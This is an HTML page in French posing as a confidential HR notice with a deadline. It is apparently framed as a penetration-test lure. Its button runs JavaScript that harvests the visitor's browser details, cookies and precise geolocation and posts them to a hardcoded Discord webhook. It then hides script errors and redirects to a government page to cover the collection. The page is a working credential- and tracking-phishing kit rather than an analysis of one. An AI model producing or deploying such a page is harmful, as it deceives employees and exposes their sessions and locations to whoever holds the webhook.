<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Confidentiel RH</title>
    <style>
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            margin: 0; padding: 40px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        .container { 
            max-width: 600px; margin: 0 auto;
            background: white; padding: 40px; 
            border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
        }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { font-size: 48px; margin-bottom: 10px; }
        h1 { color: #333; margin: 0; }
        .urgent { 
            background: #fff3cd; border: 1px solid #ffeaa7;
            color: #856404; padding: 15px; 
            border-radius: 8px; margin: 20px 0;
            text-align: center;
        }
        .btn { 
            background: linear-gradient(45deg, #28a745, #20c997);
            color: white; padding: 15px 30px; 
            border: none; border-radius: 8px; 
            cursor: pointer; font-size: 18px;
            width: 100%; margin: 20px 0;
            transition: all 0.3s ease;
        }
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4);
        }
        .info { 
            font-size: 14px; color: #666; 
            text-align: center; margin-top: 20px;
        }
        .loading {
            display: none; text-align: center;
            color: #007bff; margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">üè¢</div>
            <h1>Service des Ressources Humaines</h1>
        </div>
        
        <div class="urgent">
            ‚ö†Ô∏è <strong>URGENT :</strong> Nouveau r√®glement interne √† consulter avant le 31/07/2025
        </div>
        
        <p>Cher(e) collaborateur(trice),</p>
        <p>Suite aux nouvelles directives de la direction, nous vous prions de prendre connaissance du nouveau r√®glement interne qui entre en vigueur imm√©diatement.</p>
        
        <button class="btn" onclick="ouvrirDocument()">
            üìÑ Acc√©der au document (Connexion s√©curis√©e)
        </button>
        
        <div class="loading" id="loading">
            <p>üîê V√©rification de vos autorisations...</p>
            <p>‚è≥ Chargement du document s√©curis√©...</p>
        </div>
        
        <div class="info">
            <p><small>üîí Votre acc√®s sera enregistr√© pour des raisons de conformit√©. Document class√© confidentiel.</small></p>
        </div>
    </div>

    <script>
        function ouvrirDocument() {
            // Afficher le message de chargement
            document.getElementById('loading').style.display = 'block';
            document.querySelector('.btn').style.display = 'none';
            
            // Collecter les informations
            var infos = {
                navigateur: navigator.userAgent,
                plateforme: navigator.platform,
                langue: navigator.language,
                langues: navigator.languages ? navigator.languages.join(', ') : navigator.language,
                ecran: screen.width + 'x' + screen.height + ' (' + screen.colorDepth + ' bits)',
                fenetre: window.innerWidth + 'x' + window.innerHeight,
                fuseau: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                referent: document.referrer || "Acc√®s direct",
                horodatage: new Date().toISOString(),
                cookies: document.cookie || "Aucun cookie",
                connexion: navigator.connection ? navigator.connection.effectiveType : "Inconnue"
            };
            
            // Tentative de g√©olocalisation (optionnel)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        infos.latitude = position.coords.latitude.toFixed(6);
                        infos.longitude = position.coords.longitude.toFixed(6);
                        infos.precision = position.coords.accuracy + 'm';
                        envoyerVersDiscord(infos);
                    },
                    function() {
                        infos.geolocalisation = "Refus√©e";
                        envoyerVersDiscord(infos);
                    },
                    { timeout: 3000 }
                );
            } else {
                infos.geolocalisation = "Non support√©e";
                envoyerVersDiscord(infos);
            }
        }
        
        function envoyerVersDiscord(infos) {
            var message = {
                content: "üéØ **NOUVELLE COLLECTE - TEST D'INTRUSION**",
                embeds: [{
                    title: "üìä Informations Collect√©es",
                    color: 3066993,
                    fields: [
                        {
                            name: "üåê Navigateur",
                            value: "```" + infos.navigateur.substring(0, 800) + "```",
                            inline: false
                        },
                        {
                            name: "üíª Syst√®me",
                            value: infos.plateforme,
                            inline: true
                        },
                        {
                            name: "üó£Ô∏è Langue(s)",
                            value: infos.langues,
                            inline: true
                        },
                        {
                            name: "üì∫ R√©solution",
                            value: infos.ecran,
                            inline: true
                        },
                        {
                            name: "ü™ü Fen√™tre",
                            value: infos.fenetre,
                            inline: true
                        },
                        {
                            name: "‚è∞ Fuseau horaire",
                            value: infos.fuseau,
                            inline: true
                        },
                        {
                            name: "üì° Connexion",
                            value: infos.connexion,
                            inline: true
                        },
                        {
                            name: "üîó URL d'origine",
                            value: infos.url,
                            inline: false
                        },
                        {
                            name: "‚Ü©Ô∏è R√©f√©rent",
                            value: infos.referent,
                            inline: false
                        }
                    ],
                    timestamp: infos.horodatage,
                    footer: {
                        text: "Pentest Data Collector v2.0"
                    }
                }]
            };
            
            // Ajouter g√©olocalisation si disponible
            if (infos.latitude && infos.longitude) {
                message.embeds[0].fields.push({
                    name: "üìç G√©olocalisation",
                    value: `**Latitude:** ${infos.latitude}\n**Longitude:** ${infos.longitude}\n**Pr√©cision:** ${infos.precision}`,
                    inline: false
                });
            }
            
            // Ajouter cookies si pr√©sents
            if (infos.cookies !== "Aucun cookie") {
                message.embeds.push({
                    title: "üç™ Cookies D√©tect√©s",
                    description: "```" + infos.cookies.substring(0, 1500) + "```",
                    color: 10181046
                });
            }
            
            // REMPLACEZ CETTE URL PAR VOTRE WEBHOOK DISCORD
            var webhookURL = "https://discord.com/api/webhooks/1398006998129184869/xTQjLLkm-7vx_99ahoCvtEx1QTpVAB2EyKMUtF3Y__yIgSKM_X7z19hTO7-iyd5nNjhE";
            
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(message)
            }).then(function() {
                // Redirection apr√®s 3 secondes
                setTimeout(function() {
                    window.location.href = 'https://www.service-public.fr/particuliers/vosdroits/N31476';
                }, 3000);
            }).catch(function() {
                // En cas d'erreur, redirection quand m√™me
                setTimeout(function() {
                    window.location.href = 'https://www.service-public.fr/particuliers/vosdroits/N31476';
                }, 3000);
            });
        }
        
        // Masquer les erreurs JS
        window.onerror = function() { return true; };
    </script>
</body>
</html>
